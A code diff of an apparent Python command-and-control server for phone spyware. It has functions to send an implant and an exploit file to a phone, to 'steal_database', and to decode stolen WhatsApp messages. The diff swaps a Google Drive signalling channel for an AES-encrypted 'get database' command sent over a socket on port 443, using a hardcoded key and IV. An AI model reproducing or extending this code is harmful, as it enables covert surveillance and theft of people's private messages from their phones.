@@ -1,6 +1,6 @@
-import http.server, socket, sqlite3, json, requests, datetime, os  
-from pydrive.auth import GoogleAuth
-from pydrive.drive import GoogleDrive
+import http.server, socket, sqlite3, json, requests, datetime, os
+from Crypto.Cipher import AES
+from Crypto import Random
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -28,20 +28,24 @@ def send_implant(ip_address):
         print("Connection closed")
 
 def steal_database():
-    gauth = GoogleAuth()
-    gauth.LocalWebserverAuth()
-    drive = GoogleDrive(gauth)
-    print("Successfully logged into Google Drive") 
-    time = datetime.datetime.now()
-    os.chdir("commands")
-    file1 = drive.CreateFile({'title': 'steal_database.txt'})
-    file1.SetContentString("{}".format(datetime.datetime.now()))
-    file1.Upload()
-    log_file = open("steal_database_timestamps.txt", "w+")
-    log_file.write("Database stolen from the phone at " + str(time) + "\n")
-    log_file.close()
-    print("Log file has been updated")
-    
+    print(len("sourdoughtoast12"))
+    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    ciphertext = obj.encrypt("get0000000000000")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    port = 443             
+    s.bind(('localhost', port))
+    s.listen(1)
+    print("Listening on port 443")
+    count = 0 
+    while count < 1:
+        conn, addr = s.accept()
+        print('Got connection from: ', addr)
+        conn.send(ciphertext)
+        print("Encrypted Get Database command sent to phone")
+        count += 1
+        conn.close() 
+        print("Connection closed")
+
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
     print("Starting to decode WhatsApp messages from the SQLite3 Database")
